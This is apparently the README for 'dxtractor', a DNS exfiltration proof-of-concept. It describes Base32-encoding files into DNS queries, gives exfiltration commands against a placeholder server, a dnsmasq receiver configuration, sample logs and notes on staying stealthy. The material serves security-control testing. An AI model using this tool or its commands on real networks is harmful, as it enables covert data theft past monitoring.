# dxtractor

---

## Overview

**dxtractor** is a cross-platform DNS exfiltration proof-of-concept that encodes arbitrary files using **Base32** and transmits them through DNS queries.

It is designed for:

* DNS exfiltration testing
* Network visibility validation
* Security control evaluation (e.g., CASB, DNS filtering, EDR telemetry)

Supported platforms:

* Linux
* Windows
* macOS

---

## How it works

dxtractor performs file exfiltration over DNS using a structured approach:

1. Reads the target file as raw bytes
2. Encodes data using **Base32 (RFC4648, no padding)**
3. Splits the encoded stream into DNS-safe chunks
4. Sends each chunk as a DNS query:

```
<sequence>.<session>.<data>.<domain>
```

5. Sends a termination marker:

```
999.<session>.END.<domain>
```

This allows full reconstruction using a parser.

---

## Usage

```
dxtractor <file> <domain> <dns_server> [-p port] [-d delay] [-c chunk]
```

---

## Parameters

| Parameter  | Description                        |
| ---------- | ---------------------------------- |
| file       | File to exfiltrate                 |
| domain     | Controlled domain                  |
| dns_server | DNS server IP                      |
| -p         | DNS port (default: 5353)           |
| -d         | Delay between requests (seconds)   |
| -c         | Chunk size (multiple of 8, max 56) |

---

## Examples

```
dxtractor secret.txt dnstest.test 10.10.10.10
dxtractor secret.txt dnstest.test 10.10.10.10 -d 1
dxtractor secret.txt dnstest.test 10.10.10.10 -c 32
dxtractor secret.txt dnstest.test 10.10.10.10 -p 53 -d 1 -c 24
```

---

## Compilation

### Linux / macOS

```
gcc dns_extractor_linux.c -o dxtractor
```

or

```
gcc dns_extractor_mac.c -o dxtractor
```

---

### Windows (MinGW)

```
x86_64-w64-mingw32-gcc dns_extractor_windows.c -o dxtractor.exe -lws2_32
```

---

## DNS Receiver Setup (dnsmasq)

### Example configuration

Edit:

```
/etc/dnsmasq.conf
```

Add:

```
port=5353
log-queries
log-facility=/var/log/dnsmasq.log

listen-address=<DNS_SERVER_IP>
bind-interfaces

interface=<INTERFACE>
except-interface=lo

address=/dnstest.test/<DNS_SERVER_IP>
```

---

## Start & Validate

```
sudo systemctl restart dnsmasq
sudo systemctl status dnsmasq
```

---

## Monitor Logs

```
sudo tail -f /var/log/dnsmasq.log
```

---

## Example DNS Logs

```
query[A] 0.4321.IFBEGRCFIZDUQSKKJNGE2===.dnstest.test from 10.10.10.5
query[A] 1.4321.MFRGGZDFMZTWQ2LKNNWG====.dnstest.test from 10.10.10.5
query[A] 2.4321.OBQXE43UOJQXE3LFON2XEZJO.dnstest.test from 10.10.10.5
query[A] 999.4321.END.dnstest.test from 10.10.10.5
```

---

## Parser Example

```
python3 parser.py
```

Output:

```
[+] Session detected: 4321
[+] Total chunks: 3
[+] Reassembling data...
[+] Decoding Base32...
[+] File written: recovered_4321.bin
```

---

## Low-Level API & Networking Internals

dxtractor uses **low-level socket APIs** instead of high-level libraries, giving full control over packet construction and transmission.

---

### Windows (WinAPI / Winsock)

Networking is handled through **Winsock (`ws2_32.dll`)**.

#### APIs used

| API           | Purpose            |
| ------------- | ------------------ |
| `WSAStartup`  | Initialize Winsock |
| `socket`      | Create UDP socket  |
| `sendto`      | Send DNS packet    |
| `closesocket` | Close socket       |
| `WSACleanup`  | Cleanup Winsock    |
| `inet_pton`   | Convert IP address |

#### Execution flow

1. Initialize networking:

```
WSAStartup(MAKEWORD(2,2), &wsa);
```

2. Create UDP socket:

```
socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
```

3. Build DNS packet manually:

* Header (`dns_header`)
* QNAME (label format)
* Query type (A)
* Query class (IN)

4. Send packet:

```
sendto(...)
```

5. Cleanup resources

---

### Linux / macOS (POSIX)

Uses standard **POSIX sockets**.

#### APIs used

| API         | Purpose           |
| ----------- | ----------------- |
| `socket`    | Create UDP socket |
| `sendto`    | Send packet       |
| `close`     | Close socket      |
| `inet_pton` | Convert IP        |

#### Execution flow

1. Create socket:

```
socket(AF_INET, SOCK_DGRAM, 0);
```

2. Prepare destination (`sockaddr_in`)

3. Build DNS packet manually

4. Send:

```
sendto(...)
```

---

### Manual DNS Packet Construction

dxtractor builds DNS packets from scratch:

* Header:

  * Transaction ID
  * Flags (standard query)
  * Question count

* QNAME:

  * Converted to label format:

```
www.example.com → 3www7example3com0
```

* Query:

  * Type: A (1)
  * Class: IN (1)

This allows full control over payload structure.

---

## Notes

* Base32 avoids DNS case sensitivity issues
* Chunk size must be ≤56 and multiple of 8
* Smaller chunks = stealthier, slower
* Larger chunks = faster, noisier
* Port flexibility allows testing filtering behavior

---

## Troubleshooting

### No queries received

* Check DNS server IP
* Verify port matches (`-p`)
* Ensure dnsmasq is running
* Check interface binding

---

### `<name unprintable>` in logs

* Invalid chunk size
* Must be multiple of 8

---

### Works on Linux/Windows but not macOS

* macOS may restrict raw DNS behavior
* Try different ports (`53` vs `5353`)

---

## Disclaimer

Educational use only. Authorized environments only.

---

## Author

☠️ **b5null**
